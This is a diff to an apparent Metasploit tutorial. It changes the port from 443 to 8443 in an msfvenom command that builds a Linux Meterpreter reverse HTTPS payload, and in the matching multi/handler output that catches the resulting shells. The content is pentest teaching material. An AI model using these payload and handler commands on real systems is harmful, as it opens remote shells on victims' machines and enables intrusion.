@@ -129,7 +129,7 @@ Evasion options for payload/linux/x64/meterpreter_reverse_https:
 ```
 
 You can see that the Basic options of LHOST and LPORT are required. To input these options, you put the variables in after the payload, before the next argument.   
-`msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1`   
+`msfvenom -p linux/x64/meterpreter_reverse_https LPORT=8443 LHOST=10.0.0.1`   
 
 After this, other important arguments are:   
 ```
@@ -241,7 +241,7 @@ msf5 exploit(multi/handler) > run -j
 [*] Exploit running as background job 0.
 [*] Exploit completed, but no session was created.
 
-[*] Started HTTPS reverse handler on https://0.0.0.0:443
+[*] Started HTTPS reverse handler on https://0.0.0.0:8443
 msf5 exploit(multi/handler) > jobs
 
 
@@ -250,7 +250,7 @@ Jobs
 
   Id  Name                    Payload                              Payload opts
   --  ----                    -------                              ------------
-  0   Exploit: multi/handler  linux/x64/meterpreter_reverse_https  https://10.0.0.1:443
+  0   Exploit: multi/handler  linux/x64/meterpreter_reverse_https  https://10.0.0.1:8443
 ```
 
 This will allow Metasploit to catch Meterpreter shells until the job is killed.
